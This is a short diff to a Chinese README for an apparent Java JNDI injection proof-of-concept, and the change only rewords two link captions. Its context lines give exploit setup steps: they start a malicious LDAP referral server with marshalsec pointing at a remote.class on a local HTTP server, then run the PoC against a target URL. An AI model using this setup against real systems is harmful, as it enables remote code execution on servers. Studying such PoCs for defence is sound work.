@@ -60,12 +60,12 @@ public class remote implements ObjectFactory, Serializable {
 ### 0x03：使用方法
 
 - jetbrains IDEA ：`file -> New -> Project -> Java`
-	- *[点击更多以了解：IDEA与JAVA](https://blog.csdn.net/oschina_41790905/article/details/79475187)*
+	- *[点击以了解IDEA运行JAVA项目DEMO](https://blog.csdn.net/oschina_41790905/article/details/79475187)*
 	- `src目录 -> New -> Java Class -> poc.java`即可；
 	- `Project Structure -> Librabries -> + `添加lib文件夹即可；  
 	
 - 恶意LDAP：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.2:8000/#remote" 1099`
-    - *[点击更多以了解marshalsec](https://github.com/mbechler/marshalsec)*
+    - *[点击以了解marshalsec](https://github.com/mbechler/marshalsec)*
 - HTTP SERVER(remote.class)：`python3 -m http.server`
 
 - 填入主方法下`attck url & jndipath` -> `run poc.main()`即可。
